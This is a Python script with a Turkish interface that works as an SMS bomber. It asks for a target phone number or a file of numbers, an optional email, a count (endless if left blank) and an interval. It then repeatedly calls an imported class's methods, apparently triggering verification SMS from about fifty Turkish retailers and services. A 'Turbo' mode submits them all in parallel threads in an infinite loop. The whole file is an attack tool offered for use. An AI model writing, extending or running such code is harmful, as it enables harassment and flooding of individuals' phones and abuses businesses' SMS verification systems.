from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
from concurrent.futures import ThreadPoolExecutor, wait

servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)

            
while 1:
    system("cls||clear")
    print("""{}                                                          s
  x8h.     x8.                                           :8
:88888> .x8888x.     ..    .     :       x.    .        .88
 `8888   `8888f    .888: x888  x888.   .@88k  z88u     :888ooo
  8888    8888'   ~`8888~'888X`?888f` ~"8888 ^8888   -*8888888
  8888    8888      X888  888X '888>    8888  888R     8888
  8888    8888      X888  888X '888>    8888  888R     8888
  8888    8888      X888  888X '888>    8888  888R     8888
  8888    8888      X888  888X '888>    8888 ,888B .  .8888Lu=
-n88888x>"88888x-  "*88% "*88" '888!`  "8888Y 8888"   ^%888*
  `%888"  4888!`     `~    "    `"`     `Y"   'YP       'Y"
    `"      ""
    
    "Bir Umuttur Yaşamak..." - Code +{}{}{}・Umut Kahraman\n  
    """.format(Fore.LIGHTCYAN_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))
    try:
        menu = (input(Fore.LIGHTMAGENTA_EX + " 1・Normal SMS\n\n 2・Turbo SMS\n\n 3・Exit\n\n" + Fore.LIGHTYELLOW_EX + ""))
        if menu == "":
            continue
        menu = int(menu) 
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı Giriş. Tekrar Deneyiniz.")
        sleep(3)
        continue
    if menu == 1:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "*Birden Çoksa 'Enter' Tuşuna Basınız.\n+90 "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        tel_liste = []
        if tel_no == "":
            system("cls||clear")
            print(Fore.LIGHTYELLOW_EX + "Telefon Numaraların Kayıtlı Olduğu Dosyanın Dizinini Yazınız.\n"+ Fore.LIGHTGREEN_EX, end="")
            dizin = input()
            try:
                with open(dizin, "r", encoding="utf-8") as f:
                    for i in f.read().strip().split("\n"):
                        if len(i) == 10:
                            tel_liste.append(i)
                sonsuz = ""
            except FileNotFoundError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı Dosya Dizini. Tekrar Deneyiniz.")
                sleep(3)
                continue
        else:
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
                tel_liste.append(tel_no)
                sonsuz = "*Sonsuz İse 'Enter' Tuşuna Basınız.\n"  
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı Telefon Numarası. Tekrar Deneyiniz.") 
                sleep(3)
                continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "- Mail Adresi\n*Bilmiyorsanız 'Enter' Tuşuna Basınız.\n"+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı Mail Adresi. Tekrar Deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + f"Gönderilecek SMS Sayısını Yazınız.\n{sonsuz}"+ Fore.LIGHTGREEN_EX, end="")
            kere = input()
            if kere:
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı Giriş. Tekrar Deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Saniye Aralığını Yazınız.\n"+ Fore.LIGHTGREEN_EX, end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı Giriş. Tekrar Deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        if kere is None: 
            sms = SendSms(tel_no, mail)
            while True:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            exec("sms."+attribute+"()")
                            sleep(aralik)
        for i in tel_liste:
            sms = SendSms(i, mail)
            if isinstance(kere, int):
                    while sms.adet < kere:
                        for attribute in dir(SendSms):
                            attribute_value = getattr(SendSms, attribute)
                            if callable(attribute_value):
                                if attribute.startswith('__') == False:
                                    if sms.adet == kere:
                                        break
                                    exec("sms."+attribute+"()")
                                    sleep(aralik)
        print(Fore.LIGHTRED_EX + "\nMenüye Dönmek İçin 'Enter' Tuşuna Basınız.")
        input()
    elif menu == 3:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Çıkış Yapılıyor...")
        break
    elif menu == 2:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "+90 "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı Telefon Numarası. Tekrar Deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "- Mail Adresi\n*Bilmiyorsanız 'Enter' Tuşuna Basınız.\n"+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı Mail Adresi. Tekrar Deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        send_sms = SendSms(tel_no, mail)
        try:
            while True:
                with ThreadPoolExecutor() as executor:
                    futures = [
                        executor.submit(send_sms.Akasya),
                        executor.submit(send_sms.Akbati),
                        executor.submit(send_sms.Ayyildiz),
                        executor.submit(send_sms.Baydoner),
                        executor.submit(send_sms.Beefull),
                        executor.submit(send_sms.Bim),
                        executor.submit(send_sms.Bisu),
                        executor.submit(send_sms.Bodrum),
                        executor.submit(send_sms.Clickme),
                        executor.submit(send_sms.Dominos),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Hizliecza),
                        executor.submit(send_sms.Icq),
                        executor.submit(send_sms.Ipragaz),
                        executor.submit(send_sms.Istegelsin),
                        executor.submit(send_sms.Joker),
                        executor.submit(send_sms.KahveDunyasi),
                        executor.submit(send_sms.KimGb),
                        executor.submit(send_sms.Komagene),
                        executor.submit(send_sms.Koton),
                        executor.submit(send_sms.KuryemGelsin),
                        executor.submit(send_sms.Macro),
                        executor.submit(send_sms.Metro),
                        executor.submit(send_sms.Migros),
                        executor.submit(send_sms.Naosstars),
                        executor.submit(send_sms.Paybol),
                        executor.submit(send_sms.Pidem),
                        executor.submit(send_sms.Porty),
                        executor.submit(send_sms.Qumpara),
                        executor.submit(send_sms.Starbucks),
                        executor.submit(send_sms.Suiste),
                        executor.submit(send_sms.Taksim),
                        executor.submit(send_sms.Tasdelen),
                        executor.submit(send_sms.Tasimacim),
                        executor.submit(send_sms.Tazi),
                        executor.submit(send_sms.TiklaGelsin),
                        executor.submit(send_sms.ToptanTeslim),
                        executor.submit(send_sms.Ucdortbes),
                        executor.submit(send_sms.Uysal),
                        executor.submit(send_sms.Wmf),
                        executor.submit(send_sms.Yapp),
                        executor.submit(send_sms.YilmazTicaret),
                        executor.submit(send_sms.Yuffi)
                    ]
                    wait(futures)
        except KeyboardInterrupt:
            system("cls||clear")
            print("\nCtrl+C Tuş Kombinasyonu Algılandı. Menüye Dönülüyor...")
            sleep(2)
